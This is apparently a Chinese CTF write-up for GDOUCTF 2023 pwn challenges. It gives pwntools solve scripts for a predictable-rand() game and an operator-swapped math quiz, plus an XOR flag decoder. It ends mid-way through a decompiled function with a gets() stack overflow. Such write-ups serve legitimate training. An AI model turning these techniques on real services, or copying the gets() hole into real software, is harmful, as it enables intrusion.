<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>GDOUCTF2023_pwn | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>GDOUCTF2023_pwn</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-20T11:45:14.000Z" id="date"> 2023-07-20</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-25T09:20:08.492Z" id="updated"> 2023-08-25</time></div></span></div></div><hr><div id="post-content"><p><em>温故而知新</em><br><strong>[GDOUCTF 2023]真男人下120层</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(_bss_start, <span class="hljs-number">0LL</span>);<br>  v3 = time(<span class="hljs-number">0LL</span>);<br>  srand(v3);<br>  v8 = <span class="hljs-number">2772839826LL</span>;<br>  v4 = rand();<br>  srand(v4 % <span class="hljs-number">3</span> - <span class="hljs-number">1522127470</span>);<br>......<br> <span class="hljs-keyword">if</span> ( rand() % <span class="hljs-number">4</span> + <span class="hljs-number">1</span> != v6 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\x1B[31m&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;YOU DIED!&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    system(<span class="hljs-string">&quot;clear&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulation!&quot;</span>);<br>  cat_flag();  <br></code></pre></td></tr></table></figure>
<p>已知种子随机数<br>种子有三种情况：<br>0 - 1522127470<br>1 - 1522127470<br>2 - 1522127470</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> b;<br>        <span class="hljs-comment">//srand(0 - 1522127470);</span><br>        srand(<span class="hljs-number">1</span> - <span class="hljs-number">1522127470</span>);<br>        <span class="hljs-comment">//srand(2 - 1522127470);//三选一，不行多跑几次</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;=<span class="hljs-number">120</span>; i++)&#123;<br>                b = rand() % <span class="hljs-number">4</span> + <span class="hljs-number">1</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\&#x27;%d\&#x27;,&quot;</span>, b);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28310</span>)<br>s = [<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>):<br>  io.recv() <br>  io.sendline(<span class="hljs-built_in">str</span>(s[i]))<br>  <br>io.recv()<br>io.recv()<br>io.recv()<br></code></pre></td></tr></table></figure>
<p>靶机随机数生成可能不一样，多试几次<br><strong>[GDOUCTF 2023]小学数学</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> signal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ran</span>():<br>    <span class="hljs-keyword">return</span> random.randint(<span class="hljs-number">999</span>,<span class="hljs-number">99999</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> + <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> - <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> x <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;//&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>].replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>))<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">div</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> // <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;//&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod</span>():<br>    question = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ran()&#125;</span> % <span class="hljs-subst">&#123;ran()&#125;</span> = &quot;</span><br><br>    <span class="hljs-built_in">print</span>(question.replace(<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>))<br>    answer = <span class="hljs-built_in">eval</span>(question[:-<span class="hljs-number">2</span>])<br>    <br>    calc = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> calc == <span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong.&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  ____ ____   ___  _   _    ____ _____ _____ &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; / ___|  _ \ / _ \| | | |  / ___|_   _|  ___|&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;| |  _| | | | | | | | | | | |     | | | |_   &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;| |_| | |_| | |_| | |_| | | |___  | | |  _|  &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; \____|____/ \___/ \___/   \____| |_| |_|    &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;												&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the calculate challenge. Please try to solve 300 Question in 600 seconds.&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ATTENTION: This is an April Fool&#x27;s game, and the real problem may not be what it seems&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Press Enter to start...&quot;</span>)<br>signal.alarm(<span class="hljs-number">600</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Round: &quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>))<br>    random.choice([add,sub,mul,div,mod])()<br><br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulations on passing the challenge. This is your flag: &quot;</span> + <span class="hljs-built_in">str</span>(flag))<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">29000</span>)<br>io.sendline(<span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;plz wait..&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    io.recvuntil(<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode())<br>    num1 = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>    op = io.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)<br>    num2 = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>    <span class="hljs-built_in">print</span>(num1, op[<span class="hljs-number">0</span>], num2)<br>    <span class="hljs-keyword">if</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;-&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1+num2).encode())<br>    <span class="hljs-keyword">elif</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;x&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1-num2).encode())<br>    <span class="hljs-keyword">elif</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;/&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1*num2).encode())<br>    <span class="hljs-keyword">elif</span>(op[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;%&#x27;</span>)):<br>        io.sendline(<span class="hljs-built_in">str</span>(num1//num2).encode())<br>    <span class="hljs-keyword">else</span>:<br>        io.sendline(<span class="hljs-built_in">str</span>(num1%num2).encode())<br><br>io.interactive()<br></code></pre></td></tr></table></figure>


<p><strong>[GDOUCTF 2023]奇怪的ELF</strong><br>Linux1直接运行就行<br>Linux2是arm架构下编译的，走逆向</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:0000000000003A60                               ; char flag[17]<br>.data:0000000000003A60 F2 EE E3 D9 CA EF E8 F3 FE D9+flag DCB 0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9, 0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB<br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">flag =[<br><span class="hljs-number">0xCE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xE5</span>, <br><span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD9</span>,<br>  <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD9</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xFB</span><br>] <span class="hljs-comment">#flag1+flag2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x86</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>```    <br>**[GDOUCTF <span class="hljs-number">2023</span>]EASY PWN**<br>```c<br><span class="hljs-built_in">int</span> check()<br>&#123;<br>  <span class="hljs-built_in">int</span> result; // eax<br>  char buf[<span class="hljs-number">10</span>]; // [rsp+7h] [rbp-29h] BYREF<br>  char s1[<span class="hljs-number">15</span>]; // [rsp+11h] [rbp-1Fh] BYREF<br>  ssize_t v3; // [rsp+20h] [rbp-10h]<br>  <span class="hljs-built_in">int</span> fd; // [rsp+28h] [rbp-8h]<br>  <span class="hljs-built_in">int</span> v5; // [rsp+2Ch] [rbp-4h]<br><br>  v5 = <span class="hljs-number">0</span>;<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Can&#x27;t access /dev/urandom.&quot;</span>);<br>    exit(<span class="hljs-number">1</span>);<br>  &#125;<br>  v3 = read(fd, buf, 0xAuLL);<br>  <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Data not received from /dev/urandom&quot;</span>);<br>    exit(<span class="hljs-number">1</span>);<br>  &#125;<br>  close(fd);<br>  puts(<span class="hljs-string">&quot;Password:&quot;</span>);<br>  gets(s1);<br>  result = strcmp(s1, buf);<br>  <span class="hljs-keyword">if</span> ( result )<br>    result = puts(<span class="hljs-string">&quot;I swore that was the right password ...&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    v5 = <span class="hljs-number">1</span>;<br>  <span 